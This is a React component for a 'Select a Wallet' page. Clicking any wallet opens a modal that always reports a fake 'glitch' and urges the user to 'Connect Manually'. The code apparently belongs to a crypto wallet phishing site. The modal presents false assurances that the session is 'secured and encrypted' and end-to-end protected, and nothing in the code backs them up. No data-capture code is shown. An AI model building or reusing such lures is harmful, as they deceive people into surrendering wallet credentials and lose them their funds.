import React, { useEffect, useState } from 'react';
import '../../App.css';
import AOS from 'aos';
import 'aos/dist/aos.css'; // Import AOS CSS
import { FaShield } from 'react-icons/fa6';
import { MdCancel } from "react-icons/md";


const Coincomps = ({ data }) => {
  const [selectedItem, setSelectedItem] = useState(null);

  useEffect(() => {
    AOS.init();
    AOS.refresh();
  }, []);

  const handleItemClick = (item) => {
    setSelectedItem(item);
  };

  const handleCloseModal = () => {
    setSelectedItem(null);
  };

  return (
    <>
      <div className="mx-[3vw]">
        <h1 className="text-[30px] font-[600] text-center my-[35px]">
          Select a Wallet
        </h1>
        <div className="" data-aos="fade-up" data-aos-duration="2000">
          <div className="grid gap-y-[35px] ">
            {data.map((item) => (
              <div
                key={item.id}
                className="flex key items-center px-[20px] py-[20px] md:w-[80%] rounded shadow-2xl cursor-pointer"
                onClick={() => handleItemClick(item)}
              >
                <img
                  src={item.src}
                  alt=""
                  className="w-[60px] h-[60px] rounded-full"
                />
                <div
                  className="flex flex-col gap-[5px]"
                  data-aos="fade-right"
                  data-aos-duration="2000"
                >
                  <p className="md:text-[20px] text-[15px] font-[600]">{item.name} </p>
                  <p className="md:text-[15px] text-[12px] text-gray-500 font-[500]">
                    {item.id}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Modal */}
      {selectedItem && (
        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-75 flex justify-center items-center">
          <div className=" flex  flex-col gap-[20px] items-center bg-white p-4 rounded-lg">
            <MdCancel  onClick={handleCloseModal} color='black'  className='absolute cancel bg-white hover:cursor-[pointer]  h-[30px] w-[30px] rounded-full'/>
            <img
              src={selectedItem.src}
              alt=""
              className="w-[70px] h-[70px] rounded-full"
            />
            <p>{selectedItem.name}</p>
            <div>
              <p className='text-[25px] text-gray-500 font-[400] text-center'>This session is secured and encrypted</p>
            </div>
            <div>
              <p className='text-[15px] text-center text-red-600 font-[400] border border-red-600 px-[15px] py-[5px] w-[30vw] rounded'>Your wallet had a glitch... connect manually</p>
            </div>
            <div className='flex flex-col gap-4 w-[30vw]'>
              <button className='text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px]'>Try Again</button>
              <button className='text-[20px] text-white font-[20px] bg-blue-600 rounded-xl py-[5px]'>Connect Manually</button>
            </div>

            <div className=''>
              
              <p className='text-[15px] text-center text-gray-500 font-[500] w-[90%] flex'><FaShield size={30} color='white' className='bg-blue-500 px-[5px] rounded-full'/>This session is protected with an end-to-end encryption</p>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default Coincomps;
